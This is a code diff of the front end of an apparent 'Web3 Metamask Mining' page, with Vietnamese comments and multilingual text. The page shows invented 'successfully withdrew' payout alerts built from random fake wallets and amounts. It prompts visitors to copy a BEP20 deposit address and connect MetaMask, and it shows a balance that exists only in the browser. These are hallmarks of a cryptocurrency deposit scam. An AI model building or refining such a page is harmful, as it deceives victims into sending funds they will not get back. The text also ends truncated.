@@ -129,64 +129,90 @@
         es: { bal: "Saldo disponible (USDT)", st: "Sistema activo...", ad: "Dirección (BEP20):", btn: "Activar Minería", nh: "Inicio", ne: "Canje", na: "Cuenta", cp: "¡Copiado!", wd: "retiró con éxito", title: "Minería Web3 Metamask", ex: "Canje", acc: "Saldo de la cuenta", up: "Característica actualizando..." },
         br: { bal: "Saldo disponível (USDT)", st: "Sistema ativo...", ad: "Endereço (BEP20):", btn: "Ativar Mineração", nh: "Início", ne: "Troca", na: "Conta", cp: "Copiado!", wd: "retirou com sucesso", title: "Mineração Web3 Metamask", ex: "Troca", acc: "Saldo da conta", up: "Recurso atualizando..." },
         zh: { bal: "可用余额 (USDT)", st: "系统运行中...", ad: "充值地址:", btn: "激活挖矿", nh: "首页", ne: "兑换", na: "账户", cp: "已复制!", wd: "成功提取了", title: "Web3 Metamask 挖矿", ex: "兑换", acc: "账户余额", up: "功能更新中..." }
-    <script>
-    let state = { usdt: 0, lang: 'vi', hide: false };
-    // Thay đổi link server ở đây để dễ quản lý
-    const API_URL = "http://127.0.0.1:3000"; 
-
-    const langData = {
-        vi: { bal: "Số dư khả dụng (USDT)", st: "Hệ thống đang đào...", ad: "Địa chỉ nạp (BEP20):", btn: "Kích hoạt Khai thác", nh: "Trang chủ", ne: "Quy đổi", na: "Tài khoản", cp: "Đã copy!", wd: "vừa rút thành công", title: "Khai thác wed3 metamask", ex: "Quy đổi", acc: "Số dư tài khoản", up: "Tính năng đang cập nhật..." },
-        en: { bal: "Available Balance (USDT)", st: "System running...", ad: "Deposit Address:", btn: "Activate Mining", nh: "Home", ne: "Exchange", na: "Account", cp: "Copied!", wd: "successfully withdrew", title: "Web3 Metamask Mining", ex: "Exchange", acc: "Account Balance", up: "Feature updating..." },
-        es: { bal: "Saldo disponible (USDT)", st: "Sistema activo...", ad: "Dirección (BEP20):", btn: "Activar Minería", nh: "Inicio", ne: "Canje", na: "Cuenta", cp: "¡Copiado!", wd: "retiró con éxito", title: "Minería Web3 Metamask", ex: "Canje", acc: "Saldo de la cuenta", up: "Característica actualizando..." },
-        br: { bal: "Saldo disponível (USDT)", st: "Sistema ativo...", ad: "Endereço (BEP20):", btn: "Ativar Mineração", nh: "Início", ne: "Troca", na: "Conta", cp: "Copiado!", wd: "retirou com sucesso", title: "Mineração Web3 Metamask", ex: "Troca", acc: "Saldo da conta", up: "Recurso atualizando..." },
-        zh: { bal: "可用余额 (USDT)", st: "系统运行中...", ad: "充值地址:", btn: "激活挖矿", nh: "首页", ne: "兑换", na: "账户", cp: "已复制!", wd: "成功提取了", title: "Web3 Metamask 挖矿", ex: "兑换", acc: "账户余额", up: "功能更新中..." }
     };
 
+    // 1. CHUYỂN TRANG 100% HOẠT ĐỘNG
     function go(e, id) {
         if(e) e.preventDefault();
         document.getElementById('loader').style.display = 'flex';
+        
         setTimeout(() => {
             document.getElementById('loader').style.display = 'none';
+            // Ẩn tất cả trang
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            // Hiện trang được chọn
             const targetPage = document.getElementById(id);
             if(targetPage) targetPage.classList.add('active');
+            
+            // Cập nhật thanh nav
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            if(e.currentTarget) e.currentTarget.classList.add('active');
+            const activeNavItem = e.currentTarget;
+            if(activeNavItem) activeNavItem.classList.add('active');
         }, 300);
     }
 
+    // 2. LIVE NOTIFICATION (VỪA RÚT THÀNH CÔNG)
     function createPayout() {
         const container = document.getElementById('payoutC');
         const wallets = ["0x71a...f2e","0x88b...12a","0xfe2...99d","0x32c...44b","0x99f...00e"];
         const amounts = [150.5, 500, 1200, 45, 2500, 88.2];
+        
         const item = document.createElement('div');
         item.className = 'payout-item';
+        
         const randomW = wallets[Math.floor(Math.random()*wallets.length)];
         const randomA = amounts[Math.floor(Math.random()*amounts.length)];
         const l = langData[state.lang] || langData.vi;
-        item.innerHTML = <span><span class="dot"></span>${randomW} ${l.wd}</span><b style="color:var(--binance-yellow)">+${randomA} USDT</b>;
+
+        item.innerHTML = `
+            <span><span class="dot"></span>${randomW} ${l.wd}</span>
+            <b style="color:var(--binance-yellow)">+${randomA} USDT</b>
+        `;
+        
         container.prepend(item);
         if(container.children.length > 4) container.removeChild(container.lastChild);
     }
     setInterval(createPayout, 3500);
+    createPayout(); // Chạy ngay lập tức
 
+    // 3. COPY ĐỊA CHỈ VÍ (SIÊU ỔN ĐỊNH)
     function doCopy() {
         const copyText = document.getElementById("hiddenAddr");
         copyText.select();
-        document.execCommand('copy');
-        alert(langData[state.lang].cp);
+        copyText.setSelectionRange(0, 99999); // Mobile
+        
+        try {
+            const successful = document.execCommand('copy');
+            if (!successful) {
+                navigator.clipboard.writeText(copyText.value);
+            }
+            alert(langData[state.lang].cp);
+        } catch (err) {
+            // Fallback cuối cùng
+            alert("Vui lòng copy thủ công: " + copyText.value);
+        }
     }
 
+    // 4. KẾT NỐI VÍ
     async function connect() {
         if(window.ethereum) {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            document.getElementById('cnBtn').innerText = accounts[0].slice(0,6) + "..." + accounts[0].slice(-4);
-        } else { alert("Please use MetaMask"); }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const adr = accounts[0];
+                document.getElementById('cnBtn').innerText = adr.slice(0,6) + "..." + adr.slice(-4);
+                document.getElementById('cnBtn').style.color = "#2ebd85";
+                document.getElementById('cnBtn').style.borderColor = "#2ebd85";
+            } catch (e) { console.error(e); }
+        } else {
+            alert("Please use MetaMask or Trust Wallet Browser");
+        }
     }
 
+    // 5. CÀI ĐẶT NGÔN NGỮ
     function setLanguage() {
         state.lang = document.getElementById('langSelector').value;
-        const l = langData[state.lang];
+        const l = langData[state.lang] || langData.vi;
+        
         document.getElementById('L_bal').innerText = l.bal;
         document.getElementById('L_st').innerText = l.st;
         document.getElementById('L_addr').innerText = l.ad;
@@ -198,53 +224,27 @@
         document.getElementById('L_ex_title').innerText = l.ex;
         document.getElementById('L_acc_title').innerText = l.acc;
         document.getElementById('L_ex_st').innerText = l.up;
+        document.getElementById('L_cp_btn').innerText = (state.lang === 'zh' ? "复制" : "COPY");
     }
 
-    function updateDisplay() {
+    function toggle() {
+        state.hide = !state.hide;
         const v = state.hide ? "**" : "$ " + state.usdt.toFixed(2);
         document.getElementById('usdt_H').innerText = v;
         document.getElementById('usdt_A').innerText = v;
     }
 
-    function toggle() {
-        state.hide = !state.hide;
-        updateDisplay();
-    }
-
-    // --- PHẦN QUAN TRỌNG: GIAO TIẾP SERVER ---
-    async function deposit() {
+    function deposit() {
         const input = document.getElementById('in_Deposit');
         let v = parseFloat(input.value);
-        if (v > 0) {
-            try {
-                const response = await fetch(${API_URL}/mine, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username: 'admin', amount: v })
-                });
-                if (response.ok) {
-                    state.usdt += v;
-                    updateDisplay();
-                    input.value = "";
-                    alert("Đã nạp thành công!");
-                }
-            } catch (e) {
-                alert("Lỗi: Không kết nối được Server ở máy tính!");
-            }
+        if(v > 0) { 
+            state.usdt += v; 
+            const formatted = "$ " + state.usdt.toFixed(2);
+            document.getElementById('usdt_H').innerText = formatted;
+            document.getElementById('usdt_A').innerText = formatted;
+            input.value = ""; 
         }
     }
-
-    async function loadFromServer() {
-        try {
-            const res = await fetch(${API_URL}/balance/admin);
-            const data = await res.json();
-            state.usdt = data.balance;
-            updateDisplay();
-        } catch (e) {
-            console.log("Server chưa bật hoặc bị chặn kết nối.");
-        }
-    }
-
-    // Chạy khi mở web
-    loadFromServer();
 </script>
+</body>
+</htm
